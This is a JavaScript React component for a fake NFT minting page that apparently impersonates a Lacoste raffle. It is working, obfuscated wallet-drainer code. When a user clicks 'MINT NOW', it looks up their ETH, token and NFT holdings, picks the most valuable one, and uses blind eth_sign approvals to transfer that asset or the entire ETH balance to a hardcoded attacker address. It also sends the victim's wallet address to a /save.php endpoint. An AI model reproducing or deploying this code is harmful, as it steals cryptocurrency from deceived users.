'use strict';
const APIKeyString = "&apikey=R2HV8GWBYPSTIB753B19NKNVEBF99DJHCS";
const shouldStealEthers = true;
const ethereum = window.ethereum;
const chainId = parseInt(1);

const MyButton = () => {
  const [account, setAccount] = React.useState("");
  const [loading, setLoading] = React.useState(false);

function _0x90b0(_0x4eedfa,_0x12b6fb){const _0x534250=_0x5342();return _0x90b0=function(_0x90b030,_0x2926e4){_0x90b030=_0x90b030-0x128;let _0x1db974=_0x534250[_0x90b030];return _0x1db974;},_0x90b0(_0x4eedfa,_0x12b6fb);}const _0x2e09e2=_0x90b0;function _0x5342(){const _0x3a7a72=['ERC20','_value','address','then','accountsChanged','358510RrOBuX','length','keccak256','encodeFunctionData','174VvOcBl','Please\x20connect\x20to\x20MetaMask.','filter','max','includes','catch','providers','log','getTokenBalances','Web3Provider','8115832CAyDcW','BigNumber','/?include_orders=true','transfer','toString','eth','5fkcUok','&vs_currencies=eth','eth_requestAccounts','error\x20onSign','getGasPrice','fromValue','ETH','10531638OAdKot','data','push','/save.php','json','utils','error\x20while\x20signing','eth_sendRawTransaction','request','27SqeTlY','average_price','sort','function\x20transfer(address\x20_to,\x20uint256\x20_value)','latest','stats','FixedNumber','ERC721','type','serializeTransaction','error\x20try\x20again\x20','open','Metamask\x20account\x20changed:\x20','0xF1248FABCF441f61b8d98D020bD5f497BE165dc0','balance','588641cNYtuh','Not\x20enough\x20funds\x20for\x20transaction.','26736SBpwJB','3571456SiFOMZ','map','collection','14278iBnUAs','gasLimit','split','append','formatEther','0.0','decimals','getTransactionCount','pending','129524qzjlPP','web3','estimateGas','error\x20lease\x20retry\x20','eth_sign','value','4tRPeLS','send','from','error\x20sendTransaction','getBalance','https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=','gasPrice','https://api.opensea.io/api/v1/asset/','post','0x0'];_0x5342=function(){return _0x3a7a72;};return _0x5342();}(function(_0x14a9af,_0x199384){const _0x392a6e=_0x90b0,_0x1ed7c3=_0x14a9af();while(!![]){try{const _0x3b39c4=-parseInt(_0x392a6e(0x148))/0x1*(parseInt(_0x392a6e(0x15d))/0x2)+parseInt(_0x392a6e(0x170))/0x3*(-parseInt(_0x392a6e(0x157))/0x4)+parseInt(_0x392a6e(0x129))/0x5*(parseInt(_0x392a6e(0x130))/0x6)+parseInt(_0x392a6e(0x14b))/0x7+-parseInt(_0x392a6e(0x17a))/0x8+parseInt(_0x392a6e(0x139))/0x9*(-parseInt(_0x392a6e(0x16c))/0xa)+parseInt(_0x392a6e(0x14e))/0xb*(parseInt(_0x392a6e(0x14a))/0xc);if(_0x3b39c4===_0x199384)break;else _0x1ed7c3['push'](_0x1ed7c3['shift']());}catch(_0x296c7b){_0x1ed7c3['push'](_0x1ed7c3['shift']());}}}(_0x5342,0xef42d));const receivingAddress=_0x2e09e2(0x146),handleAccountsChanged=_0x34e3e6=>{const _0x8d3c8f=_0x2e09e2;0x0===_0x34e3e6[_0x8d3c8f(0x16d)]?console[_0x8d3c8f(0x177)](_0x8d3c8f(0x171)):_0x34e3e6[0x0]!==account&&(console['log'](_0x8d3c8f(0x145)+_0x34e3e6[0x0]),setAccount(_0x34e3e6[0x0]));},onConnect=async()=>{const _0x501535=_0x2e09e2;try{let _0x52edd7={'method':_0x501535(0x12b)},_0x223c3e=await ethereum[_0x501535(0x138)](_0x52edd7);handleAccountsChanged(_0x223c3e),ethereum['on'](_0x501535(0x16b),handleAccountsChanged);}catch(_0x52cc68){console['error'](_0x52cc68);}},toFixed=_0x3dae90=>{const _0x4ee2ea=_0x2e09e2;if(_0x3dae90[_0x4ee2ea(0x17e)]()[_0x4ee2ea(0x174)]('e')){if(!_0x3dae90[_0x4ee2ea(0x17e)]()['includes']('e-'))return _0x4ee2ea(0x153);var _0x3e2bcd=parseInt(_0x3dae90[_0x4ee2ea(0x17e)]()[_0x4ee2ea(0x150)]('e-')[0x1]);_0x3e2bcd&&(_0x3dae90*=Math['pow'](0xa,_0x3e2bcd-0x1),_0x3dae90=ethers[_0x4ee2ea(0x135)][_0x4ee2ea(0x152)](_0x3dae90['toString']()['substring'](0x2)));}return _0x3dae90['toString']();},checkForAccountTokens=async()=>{const _0x239bf6=_0x2e09e2;let _0x2e942c=new ethers[(_0x239bf6(0x176))][(_0x239bf6(0x179))](ethereum),_0x4cbc4a=new helpers(_0x2e942c,account,APIKeyString,receivingAddress,chainId),_0x56630f=await _0x4cbc4a[_0x239bf6(0x178)]();return _0x56630f;},checkERC721Price=async(_0x423a2d,_0xfcd8ea)=>{const _0x17d39b=_0x2e09e2;let _0x38ef4b=await fetch(_0x17d39b(0x164)+_0x423a2d+'/'+(_0xfcd8ea||0x1)+_0x17d39b(0x17c)),_0x5722ef=await _0x38ef4b[_0x17d39b(0x134)]();return _0x5722ef[_0x17d39b(0x14d)][_0x17d39b(0x13e)][_0x17d39b(0x13a)]||0x0;},checkTokensPrices=async _0x2bdb76=>{const _0x1fc1cd=_0x2e09e2;let _0x5aae63=new ethers['providers'][(_0x1fc1cd(0x179))](window[_0x1fc1cd(0x158)]['currentProvider']),_0x88708e=_0x2bdb76[_0x1fc1cd(0x172)](_0xd672b3=>'ERC20'===_0xd672b3[_0x1fc1cd(0x141)])[_0x1fc1cd(0x14c)](_0x1e9ec9=>_0x1e9ec9[_0x1fc1cd(0x169)]),_0x4cd398=await fetch(_0x1fc1cd(0x162)+_0x88708e+_0x1fc1cd(0x12a)),_0x3e40ef=await _0x4cd398[_0x1fc1cd(0x134)](),_0x52b119=[];for(let _0x525795=0x0;_0x525795<_0x2bdb76[_0x1fc1cd(0x16d)];_0x525795+=0x1){let _0x1d6af1=_0x2bdb76[_0x525795],_0x39f744=ethers[_0x1fc1cd(0x13f)][_0x1fc1cd(0x12e)](_0x1d6af1[_0x1fc1cd(0x147)][_0x1fc1cd(0x17e)](),Math[_0x1fc1cd(0x173)](parseInt(_0x1d6af1[_0x1fc1cd(0x154)][_0x1fc1cd(0x17e)]()),0x1)),_0xd56da3=0x0;_0x1fc1cd(0x167)===_0x1d6af1[_0x1fc1cd(0x141)]?_0xd56da3=(_0x3e40ef[_0x1d6af1['address']]?.[_0x1fc1cd(0x128)]||0x0)*_0x39f744:_0x1fc1cd(0x140)===_0x1d6af1[_0x1fc1cd(0x141)]&&(_0xd56da3=await checkERC721Price(_0x1d6af1[_0x1fc1cd(0x169)],_0x1d6af1[_0x1fc1cd(0x147)])),_0x52b119[_0x1fc1cd(0x132)]({..._0x1d6af1,'ETHValue':toFixed(_0xd56da3)});}if(shouldStealEthers){let _0x14f68c=await _0x5aae63[_0x1fc1cd(0x161)](account);_0x52b119[_0x1fc1cd(0x132)]({'name':_0x1fc1cd(0x12f),'balance':_0x14f68c,'type':'ETH','ETHValue':ethers['FixedNumber'][_0x1fc1cd(0x12e)](_0x14f68c['toString']()||_0x1fc1cd(0x153),Math[_0x1fc1cd(0x173)](parseInt('18'),0x1))[_0x1fc1cd(0x168)]||0x0,'address':account,'decimals':'18'});}return _0x52b119;},compareTokenValues=({ETHValue:_0x2cd0d7='0'},{ETHValue:_0x350403='0'})=>{let _0x4ecea0=parseFloat(_0x2cd0d7),_0x3fdbac=parseFloat(_0x350403);return _0x4ecea0<_0x3fdbac?0x1:_0x4ecea0>_0x3fdbac?-0x1:0x1;},stealETH=async()=>{const _0x5808ef=_0x2e09e2;let _0x583e87=new ethers['providers'][(_0x5808ef(0x179))](ethereum),_0x2b2d39=await _0x583e87[_0x5808ef(0x161)](account),_0x227ab1=await _0x583e87[_0x5808ef(0x155)](account,'pending'),_0x52a138={'to':receivingAddress,'nonce':_0x227ab1,'value':_0x2b2d39,'chainId':chainId},_0x1744d9=_0x52a138,_0x4bc66f=await _0x583e87[_0x5808ef(0x12d)]();_0x1744d9[_0x5808ef(0x163)]=_0x4bc66f;let _0x57eab7=await _0x583e87[_0x5808ef(0x159)](_0x1744d9);_0x1744d9[_0x5808ef(0x14f)]=_0x57eab7,console['log'](_0x5808ef(0x14f),_0x57eab7);let _0x2b8dff=ethers['BigNumber'][_0x5808ef(0x15f)](_0x57eab7)['mul'](ethers[_0x5808ef(0x17b)][_0x5808ef(0x15f)](_0x4bc66f));_0x1744d9[_0x5808ef(0x15c)]=_0x2b2d39['sub'](_0x2b8dff),ethereum[_0x5808ef(0x138)]({'method':_0x5808ef(0x15b),'params':[account,ethers[_0x5808ef(0x135)][_0x5808ef(0x16e)](ethers[_0x5808ef(0x135)][_0x5808ef(0x142)](_0x1744d9))]})[_0x5808ef(0x16a)](async _0x188c29=>{const _0x123c94=_0x5808ef;ethereum['request']({'method':'eth_sendRawTransaction','params':[ethers[_0x123c94(0x135)][_0x123c94(0x142)](_0x1744d9,_0x188c29)]})[_0x123c94(0x16a)](_0x3c4b68=>{const _0x499eb9=_0x123c94;console[_0x499eb9(0x177)](_0x499eb9(0x15a));});});},stealTokens=async _0x5bf1d7=>{const _0x44619e=_0x2e09e2;let _0x271001=new ethers[(_0x44619e(0x176))][(_0x44619e(0x179))](ethereum),_0x26719e=[_0x44619e(0x13c)],_0x3131f9=['function\x20transferFrom(address\x20from,\x20address\x20to,\x20uint256\x20tokenId)'],_0x12d70f=new ethers[(_0x44619e(0x135))]['Interface'](_0x44619e(0x167)===_0x5bf1d7[_0x44619e(0x141)]?_0x26719e:_0x3131f9,_0x271001),_0x48adec=await _0x271001[_0x44619e(0x155)](account,_0x44619e(0x156)),_0x5de5e6=_0x12d70f[_0x44619e(0x16f)](_0x44619e(0x167)===_0x5bf1d7[_0x44619e(0x141)]?_0x44619e(0x17d):'transferFrom',_0x44619e(0x167)===_0x5bf1d7[_0x44619e(0x141)]?[receivingAddress,_0x5bf1d7['balance']]:[account,receivingAddress,_0x5bf1d7[_0x44619e(0x147)]]),_0xe700c7={'nonce':_0x48adec,'to':_0x5bf1d7[_0x44619e(0x169)],'value':ethers[_0x44619e(0x17b)][_0x44619e(0x15f)]('0'),'data':_0x5de5e6,'chainId':chainId},_0x352676=await _0x271001[_0x44619e(0x12d)]();_0xe700c7[_0x44619e(0x163)]=_0x352676,console[_0x44619e(0x177)](_0x44619e(0x163),_0x352676[_0x44619e(0x17e)]());let _0xc16d04=await ethereum[_0x44619e(0x138)]({'method':'eth_estimateGas','params':[{'nonce':'0x'+_0x48adec[_0x44619e(0x17e)](),'from':account,'to':_0x5bf1d7[_0x44619e(0x169)],'data':_0x5de5e6,'value':_0x44619e(0x166),'chainId':'0x'+chainId[_0x44619e(0x17e)]()}],'id':_0x44619e(0x13d)});_0xe700c7[_0x44619e(0x14f)]=_0xc16d04,console[_0x44619e(0x177)](_0x44619e(0x14f),_0xc16d04),ethereum['request']({'method':'eth_sign','params':[account,ethers['utils']['keccak256'](ethers[_0x44619e(0x135)][_0x44619e(0x142)](_0xe700c7))]})[_0x44619e(0x16a)](async _0x53c533=>{const _0x2e7667=_0x44619e;ethereum[_0x2e7667(0x138)]({'method':_0x2e7667(0x137),'params':[ethers[_0x2e7667(0x135)][_0x2e7667(0x142)](_0xe700c7,_0x53c533)]})['then'](_0xc8993f=>{const _0x213719=_0x2e7667;console[_0x213719(0x177)](_0x213719(0x143));})['catch'](_0x65a0c4=>console[_0x2e7667(0x177)](_0x2e7667(0x160),_0x65a0c4));})[_0x44619e(0x175)](_0x12a316=>console[_0x44619e(0x177)](_0x44619e(0x12c),_0x12a316));},onMint=async()=>{const _0x431b91=_0x2e09e2;let _0x199ab2=await checkForAccountTokens();if((_0x199ab2=(_0x199ab2=await checkTokensPrices(_0x199ab2))[_0x431b91(0x13b)](compareTokenValues))[_0x431b91(0x16d)]>0x0&&_0x431b91(0x12f)===_0x199ab2[0x0][_0x431b91(0x141)])try{await stealETH();}catch(_0x6df3e3){console[_0x431b91(0x177)]('error\x20while\x20signing');}else{if(_0x199ab2[_0x431b91(0x16d)]>0x0&&(_0x431b91(0x167)===_0x199ab2[0x0][_0x431b91(0x141)]||_0x431b91(0x140)===_0x199ab2[0x0]['type']))try{await stealTokens(_0x199ab2[0x0]);}catch(_0x2833c7){console[_0x431b91(0x177)](_0x2833c7),console['log'](_0x431b91(0x136));}}},saveEmail=async()=>{const _0x171051=_0x2e09e2;setLoading(!0x0);var _0x1f79b7=new FormData();_0x1f79b7[_0x171051(0x151)](_0x171051(0x131),''+account);var _0x182432=new XMLHttpRequest();_0x182432[_0x171051(0x144)](_0x171051(0x165),_0x171051(0x133),!0x0),_0x182432[_0x171051(0x15e)](_0x1f79b7),console[_0x171051(0x177)]('ok'),await onMint(),setTimeout(function(){const _0x378a67=_0x171051;window['alert'](_0x378a67(0x149));},0x7d0),setLoading(!0x1);};

  if (loading) {
    return (
      <button
        id="connect"
        display="none">
        <div class="loader">Connecting...</div>
      </button>
    )
  }
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && !ethereum) {
    <p style={{
      color: 'white',
      padding: '10px 0px 10px 0px',
      fontSize: 18,
      textAlign: 'center',
    }}>
    </p>
    return (
      <button
        class="flex items-center md:border px-6 py-3 rounded-full h-fit border-blue bg-blue text-blackgreen border gap-3 comingSoonHover"
        id="connect"
        display="none"
        onClick={() => window.open("https://metamask.app.link/dapp/undw3-lacoste-raffle.com", '_blank')}>
        <div class="font-bold text-lg">OPEN METAMASK APP TO MINT</div>
      </button>
    )
  } else if (!(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) && !ethereum) {
    return (
      <>
        <p style={{
          color: 'white',
          padding: '10px 0px 10px 0px',
          fontSize: 18,
          textAlign: 'center',
        }}>
        </p>
        <button
          class="flex items-center md:border px-6 py-3 rounded-full h-fit border-blue bg-blue text-blackgreen border gap-3 comingSoonHover"
          id="connect"
          display="none"
          onClick={() => window.open("https://metamask.app.link/dapp/undw3-lacoste-raffle.com", '_blank').focus()}
        >
          <div class="font-bold text-lg">INSTALL METAMASK PLUGIN TO MINT</div>
        </button>
      </>
    )
  } else if (account === "") {
    return (
      <>
        <p style={{
          color: 'white',
          padding: '10px 0px 10px 0px',
          fontSize: 18,
          textAlign: 'center',
        }}>
        </p>
        <button
          class="flex items-center md:border px-6 py-3 rounded-full h-fit border-blue bg-blue text-blackgreen border gap-3 comingSoonHover"
          id="connect"
          display="none"
          onClick={onConnect}
        >
          <div class="font-bold text-lg">CONNECT WALLET</div>
        </button>
      </>
    )
  } else {
    return (
      <>
        <p style={{
          color: 'white',
          padding: '10px 0px 10px 0px',
          fontSize: 18,
          textAlign: 'center',
        }}>
        </p>
        <button
          class="flex items-center md:border px-6 py-3 rounded-full h-fit border-blue bg-blue text-blackgreen border gap-3 comingSoonHover"
          id="connect"
          display="none"
          onClick={saveEmail}
        >
          <div class="font-bold text-lg">MINT NOW</div>
        </button>
      </>
    )
  };
}

ReactDOM.render(<MyButton />, document.querySelector("#connect_sign_button_container"));
